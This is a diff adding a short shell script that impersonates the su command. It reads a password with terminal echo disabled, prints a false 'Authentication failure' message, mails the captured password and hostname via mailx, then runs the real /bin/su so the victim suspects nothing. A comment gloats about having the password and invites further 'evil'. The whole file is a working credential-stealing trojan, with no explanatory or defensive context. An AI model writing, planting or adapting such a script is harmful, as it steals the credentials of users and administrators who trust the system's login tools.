@@ -1,0 +1,15 @@
+#!/bin/sh
+
+echo -n "Password: "
+stty -echo
+read password
+echo
+stty echo
+sleep 3
+echo "su: Authentication failure"
+
+# muwahahaha, we have the password, now for the evil.
+# you can make this do what you like here.
+echo "su attempted with password: $password" | mailx -s "su attempt from `uname -n`" root@localhost
+
+exec /bin/su
